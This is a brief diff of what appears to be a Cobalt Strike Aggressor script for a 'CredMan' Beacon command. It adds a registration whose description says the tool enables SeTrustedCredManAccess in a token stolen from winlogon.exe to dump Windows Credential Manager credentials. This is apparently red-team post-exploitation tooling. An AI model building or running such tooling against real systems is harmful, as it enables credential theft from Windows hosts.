@@ -18,3 +18,6 @@ alias CredMan {
     beacon_inline_execute($1,$data,"go",$args);
 }
 
+beacon_command_register(
+"CredMan",
+"Enables SeTrustedCredManAccess Privilege in a token stolen from winlogon.exe to dump Windows Credential Manager");
